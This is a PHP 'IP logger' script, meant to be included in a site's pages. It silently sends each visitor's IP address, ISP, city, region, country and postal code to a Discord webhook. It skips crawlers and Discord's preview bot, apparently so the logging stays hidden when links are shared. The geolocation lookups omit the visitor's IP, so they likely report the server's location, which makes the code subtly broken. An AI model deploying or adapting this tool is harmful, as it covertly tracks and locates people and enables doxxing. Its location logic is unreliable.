<?php
// Please keep this copyright statement intact
// Original Creator Of This Webhook IP Logger: ᴮᵉᵗᵗᵉʳ ᴼᶠᶠ ᴳᵒⁿᵉ#0869
// Creation Date: 21/10/19 
// APIs Provided By: Octolus (geoiplookup.io) and IP-API (ip-api.com)

// NOTE: You can use this in every page if you make it an external page and require it in every other page that is PHP.

$webhookurl = "discord webhook";

$ip = isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];

if (preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $browser)) {
    exit();
}

$TheirDate = date('d/m/Y');
$TheirTime = date('G:i:s');

$details = json_decode(file_get_contents("http://ip-api.com/json/"));
$vpnCon = json_decode(file_get_contents("https://json.geoiplookup.io/"));

$vpn = ($vpnCon->connection_type === "Corporate") ? "Yes (Double Check: $details->isp)" : "No (Double Check: $details->isp)";
$flag = "https://flagsapi.com/{$details->countryCode}/flat/64.png";

$data = "**User IP:** $ip\n**ISP:** {$details->isp}\n**Date:** $TheirDate\n**Time:** $TheirTime\n**Location:** {$details->city}\n**Region:** {$details->region}\n**Country:** {$details->country}\n**Postal Code:** {$details->zip}\n**IsVPN?** $vpn (Possible False-Positives)";

$json_data = array(
    'content' => $data,
    'username' => "Loc",
    'avatar_url' => $flag
);

$make_json = json_encode($json_data);

$ch = curl_init($webhookurl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $make_json);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));

$response = curl_exec($ch);

if (curl_errno($ch)) {
    $error_msg = curl_error($ch);
    error_log("cURL error: $error_msg");
}

curl_close($ch);

?>
